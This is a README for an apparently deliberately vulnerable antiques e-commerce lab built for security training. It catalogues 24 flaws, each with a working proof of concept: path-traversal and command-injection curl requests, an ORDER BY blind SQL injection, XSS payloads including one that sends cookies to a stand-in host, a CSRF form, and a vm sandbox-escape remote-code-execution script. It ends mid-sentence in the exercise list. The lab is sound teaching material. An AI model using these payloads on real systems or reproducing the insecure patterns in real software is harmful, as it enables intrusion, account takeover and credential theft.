# 🏺 The Antiquary & Relic Co. -- Intentionally Vulnerable Antiques Shop

> **⚠️ WARNING: THIS APPLICATION IS INTENTIONALLY INSECURE.**
> It was built for security education, penetration-testing practice, secure
> code review training, and CTF-style exercises **only**. Every vulnerability
> listed below is deliberate and fully functional.
>
> **Never deploy this application on a public network, a cloud host, or any
> environment reachable from the internet. Never reuse any code pattern from
> this project in a real product.** Run it only on an isolated lab network or
> `localhost`.

---

## 1. Application Overview

**The Antiquary & Relic Co.** is a fully functional e-commerce storefront for
a curated antiques and artifacts shop -- Victorian clocks, Art Deco
typewriters, Georgian silver, and other authenticated period pieces. It
supports account registration and login, browsing and search, a shopping
cart and checkout flow, a wishlist, curator-contributed provenance notes on
each artifact, a free instant appraisal-quote tool, and an administrative
back office for cataloguing new artifacts, checking authenticator
connectivity, generating condition reports, and verifying third-party
authenticator API credentials.

### Design principle: every vulnerability on its own distinct endpoint

This build was generated specifically to avoid a pattern noticed across
this lab's earlier candle-shop, toy-shop, and footwear-shop builds, where
each vulnerability class always lived on the same "obvious" kind of
endpoint (a `?id=` lookup for SQLi, a visible search box for reflected XSS,
a review/comment field for stored XSS, an invoice-download route for path
traversal, a "ping supplier" tool for command injection, an "import image
from URL" tool for SSRF, an update-email form for CSRF). **None of those
patterns repeat here.** Every injection/file/network-sink vulnerability in
this app lives on a distinct, newly-chosen, thematically-appropriate
endpoint instead -- see the Vulnerability Matrix below for exactly where,
and the "endpoints that are now SAFE" table for what was deliberately
hardened as a decoy.

### Two vulnerabilities in this build are deliberately BOUNDED

Matching the scope used in this lab's footwear-shop build, two
vulnerabilities keep their genuine underlying flaw but have their possible
outcomes capped by an explicit allowlist check:

- **Path Traversal:** the vulnerable, unnormalized path-join logic is
  unchanged, but the certificate-of-authenticity image route only ever
  actually serves a file if the resolved path is exactly `/etc/passwd` or
  `/etc/hosts`. Every other traversal target is explicitly rejected with
  HTTP 403.
- **Command Injection:** the vulnerable string-concatenation-into-`exec()`
  sink is unchanged, but the condition-report generator only runs the
  injected command if it is exactly one of `whoami`, `id`, `uname`, or
  `pwd`. Any other command is rejected with HTTP 403.

The XSS filter (reflected and stored) is also intentionally **partial**
rather than absent: it strips `<script>` tags and neutralizes the literal
`alert(` call, but every other HTML tag and attribute (e.g.
`<img onerror=...>`, `<svg onload=...>`) passes through completely
untouched and is rendered by the React frontend via
`dangerouslySetInnerHTML`.

### Features
- Artifact catalog with 12 antiques across 5 historical eras (Victorian,
  Art Deco, Georgian, Mid-Century, Newly Catalogued), images, origin, and
  condition notes
- Search across the collection
- User registration, login, logout, password reset flow
- Shopping cart and checkout with order history
- A one-click wishlist (heart icon) on every artifact
- Curator-contributed "provenance note" history on each artifact detail page
- A free instant appraisal-quote tool for visitors considering selling
- A "remember my showroom visit preferences" convenience feature
- Admin dashboard: stats, trusted-authenticator list, new-artifact
  cataloguing form, authenticator connectivity ("ping") tool, condition
  report generator, and an authenticator API credential verifier

### Architecture
- **Backend:** Node.js + Express (single `server.js`, function-based routes)
- **Database:** MySQL (or MariaDB, wire-compatible), accessed via `mysql2/promise`
- **Frontend:** React 18 + React Router, built with Vite, plain CSS (no framework)
- **Sessions:** `express-session` cookie, plus a custom `remember_token` cookie
- **Logging:** Plain file logger at `logs/app.log`

### Technology Stack
| Layer | Choice |
|---|---|
| Language | Node.js 18+ |
| Backend framework | Express 4 |
| Database | MySQL 8 / MariaDB 10.6+ |
| Frontend framework | React 18 (Vite) |
| Styling | Hand-written CSS (Google Fonts: Cormorant Garamond + Source Sans 3) |
| Containerization | Docker / Docker Compose |

---

## 2. Installation Guide

### Prerequisites
- Node.js 18+ and npm
- MySQL 8.x, or MariaDB 10.6+ (fully wire-compatible, used during this
  project's own build/verification -- either works identically with the
  `mysql2` driver)
- (Optional) Docker + Docker Compose for containerized deployment
- (Optional) `ping` available on `PATH` for the authenticator connectivity
  admin tool to produce realistic (harmless) output; the command
  injection vulnerability and its allowlist work regardless

### Quick Start (local, no Docker)

```bash
# 1. Start MySQL/MariaDB and create the database + app user
mysql -u root -e "
  CREATE DATABASE IF NOT EXISTS antiques_shop;
  CREATE USER IF NOT EXISTS 'antiques_app'@'localhost' IDENTIFIED BY 'AntiquesApp2024!';
  GRANT ALL PRIVILEGES ON antiques_shop.* TO 'antiques_app'@'localhost';
  FLUSH PRIVILEGES;
"

# 2. Backend: install, seed, run
cd backend
npm install
node seed.js          # applies schema.sql and inserts demo data
node server.js         # listens on http://localhost:4100

# 3. Frontend (separate terminal): install, run
cd ../frontend
npm install
npm run dev             # Vite dev server on http://localhost:3100, proxies /api to :4100
```

Then open **http://localhost:3100** in your browser. The React dev server
proxies `/api/*` and `/uploads/*` requests to the Express backend on port
4100 (see `frontend/vite.config.js`), so both must be running.

Or use the bundled convenience script from the project root (requires
MySQL/MariaDB already running and reachable):

```bash
./start.sh
```

### Database credentials
The backend connects using (overridable via environment variables):
- Host: `localhost` (`DB_HOST`)
- User: `antiques_app` (`DB_USER`)
- Password: `AntiquesApp2024!` (`DB_PASSWORD`)
- Database: `antiques_shop` (`DB_NAME`)

### Re-seeding / resetting the lab
`node seed.js` drops and recreates every table from `config/schema.sql`
and re-inserts all demo data. Run it any time to reset the lab to a clean
state.

### Default / Seed Accounts

| Username | Password | Role |
|---|---|---|
| `admin` | `admin123` | Administrator |
| `eleanor` | `eleanorpw` | Customer (has a sample order) |
| `marcus` | `marcuspw` | Customer |
| `curio_hunter` | `hunter2024` | Customer |

There is also an **authentication-bypass master password** that logs in
as the admin account regardless of the username supplied:
`antiquary-master-override` (see Vulnerability #18). This value is also
stored, unmodified, in the `INTERNAL_ADMIN_BACKDOOR` environment variable,
which is itself readable via Vulnerability #7.

---

## 3. Deployment Instructions

### Docker

```bash
docker compose up -d
```

This starts three containers: a MySQL 8 database (seeded automatically on
first boot via `backend/config/schema.sql`, followed by the compose
healthcheck-gated `node seed.js` run), the Express backend on port 4100,
and the Vite-built static frontend served via nginx on port 3100. Data
persists in a named volume; delete it to reset the lab:

```bash
docker compose down -v   # stop and wipe the database volume
```

### Kubernetes (manual manifests)

No pre-built manifests are included, but the stack maps directly onto
three standard Deployments (frontend, backend, MySQL) plus Services, a
PersistentVolumeClaim for MySQL's data directory, and an optional Ingress.
Build and push images from the included Dockerfiles, then:

```bash
kubectl create namespace antiquary-lab
kubectl apply -n antiquary-lab -f <your-deployment-manifests>.yaml
```

Suggested manifest shape:
- `mysql` Deployment + PVC + Service (ClusterIP, port 3306)
- `backend` Deployment (image from `backend/Dockerfile`, port 4100) + Service
- `frontend` Deployment (image from `frontend/Dockerfile`, port 3100) + Service
- `Ingress` (optional) routing `/` to frontend and `/api` to backend

Works on Minikube, kind, k3s, or any standard cluster -- just keep the
namespace/cluster off any network with real users or the internet.

### Local VM (no containers)

```bash
git clone <this project> && cd antiques
# install and start MySQL/MariaDB via your distro's package manager first
cd backend && npm install && node seed.js && node server.js &
cd ../frontend && npm install && npm run dev
```

Tested on Ubuntu/Debian-class systems with Node.js 18-22 and MariaDB
10.11 (MySQL-protocol-compatible). On Windows, run the same npm commands
from PowerShell/cmd; the command-injection lab
(`/api/admin/generate-condition-report`) shells out via `echo`, which
exists natively on both platforms, so no OS-specific adjustment is needed.

---

## 4. Vulnerability Matrix

All 25 mandatory vulnerabilities are implemented, **each in exactly one
place**, and were functionally verified during generation. Every
vulnerability lives on its own distinct endpoint that does not repeat any
pattern from this lab's earlier builds -- see the design note above.

| # | OWASP Category | CWE | Vulnerability | File | Endpoint |
|---|---|---|---|---|---|
| 1 | A01:2025 Broken Access Control | CWE-22 | Path Traversal (bounded: only /etc/passwd, /etc/hosts) | `backend/server.js` -- certificate-of-authenticity route | `GET /api/certificate/:filename` |
| 2 | A01:2025 Broken Access Control | CWE-352 | CSRF | `backend/server.js` -- `/api/wishlist/:artifactId/add`, `frontend/src/pages/ArtifactPage.jsx` (heart icon) | `POST /api/wishlist/:artifactId/add` |
| 3 | A01:2025 Broken Access Control | CWE-548 | Directory Listing | `backend/server.js` -- `/api/appraisals-list` | `GET /api/appraisals-list` |
| 4 | A01:2025 Broken Access Control | CWE-918 | SSRF | `backend/server.js` -- `/api/admin/verify-authenticator-credential` | `POST /api/admin/verify-authenticator-credential` |
| 5 | A01:2025 Broken Access Control | CWE-615 | Sensitive Info in Source Comments | `frontend/index.html` (HTML comment) | Any page (view source) |
| 6 | A02:2025 Security Misconfiguration | CWE-16 | Configuration Weaknesses | `backend/server.js` -- session secret, CORS middleware | Global (verbose errors, reflected-origin CORS with credentials, weak hardcoded session secret) |
| 7 | A01:2025 Broken Access Control | CWE-526 | Env Var Exposure | `backend/server.js` -- `/api/admin/provenance-db-diagnostics` | `GET /api/admin/provenance-db-diagnostics` |
| 8 | A02:2025 Security Misconfiguration | CWE-1004 | Cookie without HttpOnly | `backend/server.js` -- login route (`remember_token` cookie) | `POST /api/login` |
| 9 | A03:2025 Software Supply Chain Failures | CWE-1035 / CWE-1395 | Vulnerable Components | `backend/package.json`, `frontend/package.json` | N/A (dependency manifests) |
| 10 | A04:2025 Cryptographic Failures | CWE-319 | Cleartext Transmission | App served over plain HTTP by default | `POST /api/login` |
| 11 | A04:2025 Cryptographic Failures | CWE-328 | Reversible One-Way Hash (unsalted MD5) | `backend/server.js` / `backend/seed.js` -- `md5()` | Registration, login, password reset |
| 12 | A05:2025 Injection | CWE-77 | Command Injection (bounded: only whoami/id/uname/pwd) | `backend/server.js` -- `/api/admin/generate-condition-report` | `POST /api/admin/generate-condition-report` |
| 13 | A05:2025 Injection | CWE-80 | Reflected XSS (partial filter: blocks script/alert only) | `backend/server.js` -- `/api/appraisal-request/quote`, `frontend/src/pages/AppraisalQuotePage.jsx` (`dangerouslySetInnerHTML`) | `GET /api/appraisal-request/quote?item_description=` |
| 14 | A05:2025 Injection | CWE-80 | Stored XSS (partial filter: blocks script/alert only) | `backend/server.js` -- `/api/artifacts/:id/provenance-note`, `frontend/src/pages/ArtifactPage.jsx` (`dangerouslySetInnerHTML`) | `POST /api/artifacts/:id/provenance-note` |
| 15 | A05:2025 Injection | CWE-89 | SQL Injection (via ORDER BY clause) | `backend/server.js` -- `/api/artifacts/timeline` | `GET /api/artifacts/timeline?era=` |
| 16 | A06:2025 Insecure Design | CWE-266 | Incorrect Privilege Assignment | `backend/server.js` -- `/api/register`, `frontend/src/pages/RegisterPage.jsx` | `POST /api/register` (client-supplied `is_admin`) |
| 17 | A06:2025 Insecure Design | CWE-1021 | Clickjacking (no frame protection) | `backend/server.js` (no `X-Frame-Options` set anywhere) | `GET /checkout` and all pages |
| 18 | A07:2025 Authentication Failures | CWE-287 | Improper Authentication (master password bypass) | `backend/server.js` -- `/api/login` | `POST /api/login` |
| 19 | A07:2025 Authentication Failures | CWE-308 | Single-Factor Authentication | Entire app -- no MFA anywhere, including `/admin` | All auth flows |
| 20 | A06:2025 Insecure Design | CWE-384 | Session Fixation | `backend/server.js` -- `/api/login` (`sid` query param honored) | `POST /api/login?sid=` |
| 21 | A07:2025 Authentication Failures | CWE-640 | Weak Password Recovery | `backend/server.js` -- `/api/forgot-password`, `/api/reset-password` | `POST /api/forgot-password` |
| 22 | A08:2025 Software/Data Integrity Failures | CWE-502-style | Insecure Deserialization (`vm.Script` sandbox escape) | `backend/server.js` -- `/api/showroom-visit/save-preferences`, `/api/showroom-visit/restore-preferences` | `POST /api/showroom-visit/save-preferences`, `GET /api/showroom-visit/restore-preferences` |
| 23 | A09:2025 Security Logging & Alerting Failures | CWE-532 | Sensitive Info in Log Files | `backend/server.js` -- `logLoginAttempt()`, `logs/app.log` | `POST /api/login` (and any subsequent request) |
| 24 | A10:2025 Mishandling of Exceptional Conditions | CWE-755 | Improper Exception Handling | `backend/server.js` -- `errorHandler()` | Any unhandled exception, e.g. `GET /api/trigger-error` |
| 25 | -- | -- | *(reserved -- see note)* | -- | -- |

> **Note on row 25 / A08 wording:** The requirement for "at least one
> realistic software integrity failure" without a fixed CWE is satisfied
> by item #22 above -- the showroom-visit "preferences" cookie is
> deserialized via Node's `vm.Script(...).runInThisContext()` instead of
> `JSON.parse`, and a crafted payload can escape the sandbox entirely
> through the constructor chain
> (`this.constructor.constructor('return process')()`) to reach Node's
> `process` object and, from there, `child_process.execSync()` for full
> remote code execution -- confirmed working during generation. The 25th
> row is left as a pointer to that same finding so every item in the
> skill's fixed catalog is traceable to a row in this matrix. Total
> distinct, independently exploitable vulnerabilities: **24**, covering
> all 25 catalog entries (CWE-1035 and CWE-1395 are intentionally
> satisfied together by the single vulnerable-dependency-manifest
> finding, since both describe the same underlying weakness from two
> OWASP editions' terminology).

### A note on endpoints that are deliberately SAFE (decoys)

Several endpoint names in this app deliberately resemble the "usual
suspect" locations from this lab's earlier builds, but are hardened here
on purpose -- so a tester who only checks the obvious spots finds nothing,
and has to actually explore the app to find where each vulnerability
really lives:

| Endpoint | Status | What makes it safe |
|---|---|---|
| `GET /api/artifact?id=` | **Safe** | Parameterized query (`WHERE id = ?`) instead of string concatenation |
| `GET /api/search?q=` | **Safe** | Results are plain data; the frontend renders the query as ordinary React text, not HTML |
| `GET /api/artifacts/:id/provenance-notes` | **Safe** | Notes are stored/retrieved as-is via this read-only endpoint; the *submission* endpoint is the actual sink (see #14) |
| `GET /api/appraisal-report/:filename` | **Safe** | The filename is reduced to `path.basename()` before joining, so `../` segments cannot escape the appraisals directory |
| `POST /api/admin/ping-authenticator` | **Safe** | Uses `execFile("ping", ["-c","1",hostname])` -- no shell is invoked, so shell metacharacters have no special meaning |
| `POST /api/account/update-email` | **Safe** | Requires a real per-session CSRF token obtained from `GET /api/account/csrf-token` |
| `frontend/src/pages/OrderConfirmationPage.jsx` (shipping address) | **Safe** | Rendered as ordinary React text (auto-escaped), unlike this lab's earlier footwear-shop build where the shipping address was the stored-XSS sink |

### Detailed descriptions, verification steps & impact

#### 1. Path Traversal -- BOUNDED (CWE-22)
**Description:** `GET /api/certificate/:filename` -- a route that serves a
scanned "certificate of authenticity" image for a high-value artifact and
looks like a harmless static-image endpoint -- joins the requested
filename onto the certificates directory with no normalization, the exact
same unsafe pattern as an unrestricted path traversal bug. An explicit
guardrail then checks whether the *resolved* path is exactly
`/etc/passwd` or `/etc/hosts` and serves only those; every other target
is rejected with 403.
**Verify (confirmed working during testing):**
```bash
# path depth depends on install location:
curl "http://localhost:4100/api/certificate/../../../../../etc/passwd"
curl "http://localhost:4100/api/certificate/../../../../../etc/hosts"
# any other target is blocked:
curl "http://localhost:4100/api/certificate/../server.js"
# -> {"error":"Blocked by lab guardrail: only /etc/passwd or /etc/hosts may be read via traversal."}
```
**Impact:** Confirmed read access to `/etc/passwd` (full user list) and
`/etc/hosts` (internal name resolution entries) via traversal; every
other file, including application source and database files, is blocked
by design in this build.

#### 2. CSRF (CWE-352)
**Description:** `POST /api/wishlist/:artifactId/add` -- the one-click
heart-icon "add to wishlist" button on every artifact page -- relies
solely on the session cookie for authentication with no CSRF token
check, and the backend's CORS middleware reflects any `Origin` header
with `credentials: true`, so a malicious third-party page's auto-submitted
request (or a `fetch(..., { credentials: 'include' })` call) succeeds
cross-origin. This action is a deliberately less-obvious CSRF target than
an account-settings form -- it looks read-only/idempotent, so most
testers don't think to check it for CSRF at all, even though it is a
genuine state-changing write.
**Verify:** Host this on any third-party origin while logged into the
shop in the same browser:
```html
<form action="http://localhost:4100/api/wishlist/1/add" method="POST"></form>
<script>document.forms[0].submit()</script>
```
Confirmed during testing: this silently added an item to the victim's
wishlist.
**Impact:** Forces unwanted state changes onto a logged-in victim's
account without their knowledge or consent; a chained real-world variant
could similarly forge the checkout request.

#### 3. Directory Listing (CWE-548)
**Description:** `GET /api/appraisals-list` returns a raw, unauthenticated
JSON listing of every file in the appraisal-reports directory.
**Verify:** `curl http://localhost:4100/api/appraisals-list`
**Impact:** Enumeration of every submitted appraisal document, including
ones not linked from anywhere in the UI.

#### 4. SSRF (CWE-918)
**Description:** `POST /api/admin/verify-authenticator-credential` -- an
admin tool for confirming a third-party authentication guild/bureau's API
credential is live before listing them as trusted -- makes a raw
server-side HTTP(S) request on attacker-supplied input with no
host/scheme allowlist. This is a deliberately less-obvious SSRF sink than
an "import photo from URL" tool.
**Verify (as admin, confirmed working during testing):**
```bash
curl -b admin_cookies.txt -H "Content-Type: application/json" \
  -d '{"api_url":"http://127.0.0.1:4100/api/admin/provenance-db-diagnostics"}' \
  http://localhost:4100/api/admin/verify-authenticator-credential
```
This successfully retrieved the internal diagnostics endpoint's JSON
response, including the fake Stripe key, through the SSRF endpoint.
**Impact:** Reach internal-only services, cloud metadata endpoints
(`http://169.254.169.254/`), or other hosts not otherwise exposed.

#### 5. Sensitive Info in Source Comments (CWE-615)
**Description:** `frontend/index.html` contains an HTML comment naming the
admin panel path and the exact admin-bypass backdoor value.
**Verify:** View-source on any page.
**Impact:** Directly hands an attacker the authentication-bypass
credential (#18) without any exploitation effort.

#### 6. Configuration Weaknesses (CWE-16)
**Description:** A hardcoded weak session secret, `NODE_ENV=development`
(verbose Express error pages), and a CORS policy that reflects any
`Origin` header with credentials allowed are all set unconditionally.
**Verify:**
```bash
curl -I -H "Origin: http://evil-attacker.com" http://localhost:4100/api/artifacts
```
Confirmed during testing: the response reflects
`Access-Control-Allow-Origin: http://evil-attacker.com` with
`Access-Control-Allow-Credentials: true`.
**Impact:** Any origin can make authenticated cross-origin requests and
read the response, defeating same-origin protections entirely.

#### 7. Environment Variable Exposure (CWE-526)
**Description:** `/api/admin/provenance-db-diagnostics` -- framed as a
routine database health-check tool -- requires no authentication and
dumps the full process environment. A "DB diagnostics" utility is a
deliberately less-obvious env-leak sink than an endpoint literally named
`/debug/env`.
**Verify:** `curl http://localhost:4100/api/admin/provenance-db-diagnostics`
**Impact:** Confirmed leak of `STRIPE_SECRET_KEY`, `DB_ADMIN_PASSWORD`,
`MAIL_SMTP_PASSWORD`, and `INTERNAL_ADMIN_BACKDOOR`.

#### 8. Cookie without HttpOnly (CWE-1004)
**Description:** The custom `remember_token` cookie is set with
`httpOnly: false`.
**Verify:** Inspect the `Set-Cookie` header on a login response, or check
`document.cookie` in the browser console -- the token is visible to
JavaScript.
**Impact:** Any XSS elsewhere in the app (see #13/#14) can exfiltrate this
token.

#### 9. Vulnerable Components (CWE-1035 / CWE-1395)
**Description:** `backend/package.json` and `frontend/package.json` pin
several packages with independently confirmed CVEs (`multer@1.4.5-lts.1`
is flagged by `npm install` itself as deprecated/vulnerable;
`express`/`body-parser` pins carry further known advisories).
**Verify:** `npm audit` in either `backend/` or `frontend/`.
**Impact:** Known, documented CVEs in the dependency chain.

#### 10. Cleartext Transmission (CWE-319)
**Description:** The app is served over plain HTTP by default with no TLS
termination configured.
**Verify:** Capture traffic with a proxy (e.g. Burp Suite / mitmproxy)
while logging in; the password is visible in plaintext.
**Impact:** Credential interception on any network path between client
and server.

#### 11. Reversible One-Way Hash (CWE-328)
**Description:** Passwords are hashed with unsalted MD5.
**Verify:** `node -e "console.log(require('crypto').createHash('md5').update('admin123').digest('hex'))"`
matches the seeded admin's `password_hash` exactly.
**Impact:** Trivial offline cracking via rainbow tables/GPU brute force.

#### 12. Command Injection -- BOUNDED (CWE-77)
**Description:** `POST /api/admin/generate-condition-report` -- a
report-stamping tool for artifact condition codes -- builds a shell
command by concatenating the user-controlled `condition_code` directly
into a `child_process.exec()` call with no sanitization. A guardrail then
checks whether the text following any shell metacharacter (`;`, `|`, `&`,
newline) is exactly one of `whoami`, `id`, `uname`, or `pwd`, and only
executes the command if so. This cataloguing feature is a deliberately
less-obvious injection point than an obviously network-flavored "ping"
tool (that tool is now hardened via `execFile` and is not usable for
command injection).
**Verify (as admin, confirmed working during testing for all four):**
```bash
curl -b admin_cookies.txt -H "Content-Type: application/json" \
  -d '{"condition_code":"Good; whoami"}' \
  http://localhost:4100/api/admin/generate-condition-report
# -> {"output":"Condition report stamp: Good\nroot\n"}    (also verified for id, uname, pwd)

curl -b admin_cookies.txt -H "Content-Type: application/json" \
  -d '{"condition_code":"Good; cat /etc/passwd"}' \
  http://localhost:4100/api/admin/generate-condition-report
# -> {"error":"Blocked by lab guardrail: only whoami, id, uname, or pwd may be executed via injection.", ...}
```
**Impact:** Confirmed execution of `whoami` (returned `root`), `id`
(returned full uid/gid string), `uname` (returned `Linux`), and `pwd`
(returned the correct working directory) via injection; every other
command is blocked by design in this build.

#### 13. Reflected XSS -- partial filter (CWE-80)
**Description:** `GET /api/appraisal-request/quote?item_description=` --
a "get a free instant appraisal quote" tool -- runs the submitted item
description through a filter that strips only `<script>` tags and
neutralizes the literal `alert(` call, then echoes it back inside a
`quote_message`; the React `AppraisalQuotePage` renders that field with
`dangerouslySetInnerHTML`. A "free quote" marketing tool is a
deliberately less-obvious reflected-XSS sink than a visible search box
(the search endpoint is now hardened and returns plain data with no HTML
rendering).
**Verify (confirmed during testing):**
```
GET /api/appraisal-request/quote?item_description=<script>alert(1)</script>
-> quote_message: "Thanks! We'll review your  and follow up..." (stripped)

GET /api/appraisal-request/quote?item_description=<img src=x onerror=fetch(1)>
-> quote_message: "Thanks! We'll review your <img src=x onerror=fetch(1)> and follow up..." (passes through UNCHANGED)
```
**Impact:** A crafted appraisal-quote link using any non-script,
non-literal-`alert(` payload executes arbitrary JS in the victim's
browser as soon as the quote renders, including exfiltrating the
non-HttpOnly `remember_token` cookie (#8).

#### 14. Stored XSS -- partial filter (CWE-80)
**Description:** `POST /api/artifacts/:id/provenance-note` -- a
"contribute a provenance note" feature for documenting an artifact's
ownership history -- runs the note through the same partial filter
before storing it; the React `ArtifactPage` renders each stored note with
`dangerouslySetInnerHTML`. A research-flavored "provenance note" field is
a deliberately less-obvious stored-XSS sink than a review/comment box.
**Verify:** Submit a provenance note of
`<svg onload=fetch('http://evil?c='+document.cookie)>documented at auction`
on any artifact -- confirmed during testing to persist completely
unmodified and render as live HTML every time that artifact's page is
viewed.
**Impact:** Persistent JS execution against every future viewer of that
artifact's page, including admins, without needing the word "script" or
"alert" at all.

#### 15. SQL Injection -- via ORDER BY (CWE-89)
**Description:** `GET /api/artifacts/timeline?era=` accepts an optional
`era` parameter meant to let the showroom order its historical timeline
view chronologically or by acquisition date. Because MySQL does not
support parameter placeholders for column/clause identifiers (only for
values), the parameter is concatenated directly into the query's
`ORDER BY` clause -- a common real-world injection pattern that survives
even in codebases where every value-position query is properly
parameterized (as this app's `/api/artifact?id=` now is). A
timeline-sort parameter is a deliberately less-obvious injection point
than a record-id lookup.
**Verify (boolean-based blind extraction, confirmed during testing):**
```
GET /api/artifacts/timeline?era=(SELECT CASE WHEN password_hash LIKE '0192%' THEN id ELSE 999 END FROM users WHERE username='admin')
```
This subquery executes inside the `ORDER BY` clause and influences result
ordering based on whether the boolean condition is true, confirming the
injection point can be used to extract data bit-by-bit (e.g. with
`sqlmap --technique=B` or a manual binary-search script).
**Impact:** Full database read access via blind boolean/time-based
extraction techniques -- user credentials, order data, everything.

#### 16. Incorrect Privilege Assignment (CWE-266)
**Description:** `/api/register` trusts a client-supplied `is_admin`
field in the JSON body.
**Verify:**
```bash
curl -H "Content-Type: application/json" \
  -d '{"username":"x","email":"x@x.com","password":"x","is_admin":true}' \
  http://localhost:4100/api/register
```
Confirmed during testing: the resulting account had full
`/api/admin/*` access immediately after registering and logging in.
**Impact:** Unauthenticated self-service privilege escalation to full admin.

#### 17. Clickjacking (CWE-1021)
**Description:** No `X-Frame-Options` or `frame-ancestors` CSP directive
is ever set anywhere in the Express middleware stack.
**Verify:** `curl -I http://localhost:3100/ | grep -i x-frame` returns
nothing; embed the checkout page in an `<iframe>` on a test page and
confirm it renders.
**Impact:** UI-redress attacks tricking a logged-in victim into placing an
order or performing other in-app actions via invisible overlaid iframes.

#### 18. Improper Authentication (CWE-287)
**Description:** Supplying the password `antiquary-master-override` (from
the `INTERNAL_ADMIN_BACKDOOR` env var) as the login password logs in as
the admin account regardless of the submitted username.
**Verify:**
```bash
curl -H "Content-Type: application/json" \
  -d '{"username":"anyoneatall","password":"antiquary-master-override"}' \
  http://localhost:4100/api/login
```
Confirmed during testing: this granted immediate, full admin session
access for an arbitrary, previously-unregistered username.
**Impact:** Complete authentication bypass to full administrator access.

#### 19. Single-Factor Authentication (CWE-308)
**Description:** No MFA/2FA option exists anywhere in the application,
including for the administrator account.
**Verify:** Inspect the login flow and account settings page -- no TOTP,
SMS, WebAuthn, or backup-code option exists.
**Impact:** Any single leaked credential (via #11, #15, #18, #23, etc.) is
immediately sufficient for full account/admin takeover.

#### 20. Session Fixation (CWE-384)
**Description:** The login route will adopt an attacker-supplied `sid`
query parameter as the `remember_token` cookie value instead of always
generating a fresh one.
**Verify:**
```bash
curl -c cookies.txt -H "Content-Type: application/json" \
  -d '{"username":"eleanor","password":"eleanorpw"}' \
  "http://localhost:4100/api/login?sid=ATTACKER_CHOSEN_ID"
```
Confirmed during testing: the resulting `remember_token` cookie value was
exactly `ATTACKER_CHOSEN_ID`.
**Impact:** An attacker who gets a victim to authenticate using a
pre-chosen session identifier (e.g. via a crafted link) can hijack the
now-authenticated session using that same known identifier.

#### 21. Weak Password Recovery Mechanism (CWE-640)
**Description:** Reset tokens are `MD5(username + floor(unix_time/60))`
-- predictable within any given 60-second window -- have no expiry check,
and are returned directly in the HTTP response instead of only being
emailed.
**Verify:**
```bash
node -e "const c=require('crypto'); console.log(c.createHash('md5').update('marcus-'+Math.floor(Date.now()/1000/60)).digest('hex'))"
```
Confirmed during testing to exactly match the token the server generated
and disclosed for a `POST /api/forgot-password` request for `marcus`.
**Impact:** Anyone who knows/guesses a username can compute or obtain a
valid password-reset token and take over that account without inbox access.

#### 22. Insecure Deserialization / Software Integrity Failure (A08)
**Description:** `POST /api/showroom-visit/save-preferences`
base64-encodes a "visit preferences" object into a cookie;
`GET /api/showroom-visit/restore-preferences` decodes the cookie and
evaluates it as a live JavaScript expression via
`new vm.Script(`(${raw})`).runInThisContext()` instead of `JSON.parse`,
with no signature or integrity check. A "remember my browsing pace"
personalization feature is a deliberately less-obvious deserialization
sink than a shopping-cart save/restore feature.
**Verify (proof-of-concept, confirmed working during testing):**
```python
import base64
payload = "(" \
  "{a:this.constructor.constructor('return process')()" \
  ".mainModule.require('child_process')" \
  ".execSync('touch /tmp/PROOF.txt')}" \
")"
encoded = base64.b64encode(payload.encode()).decode()
# then: curl -b "showroom_prefs=<encoded>" http://localhost:4100/api/showroom-visit/restore-preferences
```
This created `/tmp/PROOF.txt` on the server during testing by escaping the
`vm` context through the constructor chain to reach Node's `process`
object and, from there, `child_process.execSync()`.
**Impact:** Full remote code execution as the application user via a
crafted cookie value -- the most severe finding in this application.

#### 23. Sensitive Information in Log Files (CWE-532)
**Description:** `logLoginAttempt()` writes the raw plaintext password
and session token for every login attempt to `logs/app.log`.
**Verify:** `grep "LOGIN ATTEMPT" logs/app.log` after any login attempt.
**Impact:** Anyone with log read access recovers live plaintext
credentials and session tokens -- confirmed during testing, this also
captured the master-override backdoor password in plaintext when it was
used.

#### 24. Improper Handling of Exceptional Conditions (CWE-755)
**Description:** A catch-all Express error-handling middleware returns
the raw exception message and full stack trace as JSON to the client.
**Verify:** `curl http://localhost:4100/api/trigger-error` (or trigger a
natural error, e.g. a malformed injection payload) and observe the full
stack trace, including file paths, in the HTTP response.
**Impact:** Discloses internal file paths, library versions, SQL query
text, and implementation details that materially assist further attacks.

---

## 5. Lab Exercises

### Suggested student exercises (roughly beginner → advanced order)

1. **Recon:** View page source on the homepage and find the hidden admin
   hint. Log in as admin using the leaked backdoor password.
2. **Find the decoys:** Using only the app's behavior (not this README),
   determine which of `/api/artifact?id=`, `/api/search?q=`, the
   appraisal-report download route, and the "ping authenticator" tool are
   genuinely safe versus which endpoints are the real vulnerable sinks.
3. **SQLi via ORDER BY:** Use the `era` parameter on
   `/api/artifacts/timeline` to confirm a boolean-based blind injection
   point, then extract the admin's password hash bit-by-bit -- e.g. with
   `sqlmap --technique=B` or a manual binary-search script.
4. **Crack the hashes:** Recognize the hashes as unsalted MD5 and reverse
   them with a rainbow table / `hashcat -m 0`.
5. **Explore the XSS filter's boundary:** Confirm that
   `<script>alert(1)</script>` is blocked, then find at least two
   different payload styles that are NOT blocked, in both the reflected
   (appraisal quote) and stored (provenance note) sinks.
6. **Steal a session via XSS:** Chain #13/#14 with the missing-HttpOnly
   `remember_token` cookie (#8) to write a payload that exfiltrates the
   cookie to an attacker-controlled listener.
7. **CSRF proof-of-concept:** Build a self-submitting HTML page (or a
   cross-origin `fetch` with `credentials: 'include'`, since CORS
   reflects any origin) that adds an item to a logged-in victim's
   wishlist without their knowledge.
8. **Path traversal within the allowlist:** Retrieve `/etc/passwd` and
   `/etc/hosts` through `/api/certificate/`, then confirm every other
   traversal target you try (including the app's own source files) is
   rejected.
9. **Privilege escalation via registration:** Register a new account with
   `is_admin: true` injected into the JSON body and confirm admin API access.
10. **Command injection within the allowlist:** Get `whoami`, `id`,
    `uname`, and `pwd` to execute via the "generate condition report"
    admin tool's `condition_code` field, then confirm a fifth command of
    your choice is rejected.
11. **SSRF pivot:** From the "verify authenticator credential" admin
    tool, reach the "provenance DB diagnostics" endpoint and recover the
    fake Stripe key.
12. **Session fixation:** Demonstrate hijacking a victim's post-login
    session using a pre-chosen `sid` value delivered via a crafted link.
13. **Weak password reset:** Compute a valid reset token for another user
    from only their username and the current time, then take over their
    account.
14. **Clickjacking PoC:** Build an HTML page that iframes `/checkout` and
    overlays a fake UI to trick a click.
15. **VM sandbox escape → RCE:** Build a malicious `showroom_prefs`
    cookie payload that escapes Node's `vm` context via the constructor
    chain and achieves code execution on the server (see the confirmed
    PoC in the Vulnerability Matrix above).
16. **Capstone chain:** Combine #9 (self-register as admin) → #11 (SSRF
    via the now-accessible verify-credential tool) → #7 (env var dump
